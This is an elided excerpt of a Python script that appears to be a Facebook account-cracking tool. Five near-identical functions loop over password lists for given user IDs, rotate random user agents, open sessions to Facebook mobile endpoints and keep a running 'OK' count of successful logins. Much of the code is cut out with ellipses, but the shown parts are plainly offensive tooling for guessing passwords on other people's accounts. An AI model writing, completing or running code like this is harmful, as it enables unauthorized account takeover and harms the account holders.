...
def Asraful1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mDX-M1\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            ...
            'dpr': '2.75',
            'referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=AfeSuPXBTjGgOGlbddg6jas3uPYJa2S9WHUWrTNnXTvStrjxU2UEV58MLe76hdMjrTyKWHu6ZP4eG3aunp1rThlfq6_1OVJzXwlr6RxUGvSn_A&smuh=21931&lh=Ac-jZYA1meEttFR2wm0&wtsid=rdr_0fczgKU6cao8NNMF2&refid=8&hide_dialog=1&refsrc=deprecated&_rdr',
...
def Asraful2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mDX-M2\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
...
def Asraful3(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mDX-M3\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            hasanasha = random.choice(ugen)
...
def Asraful4(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mDX-M4\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            hasanasha = random.choice(ugen)
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
...
def Asraful5(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mDX-M5\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            ashahasan = random.choice(bangla)
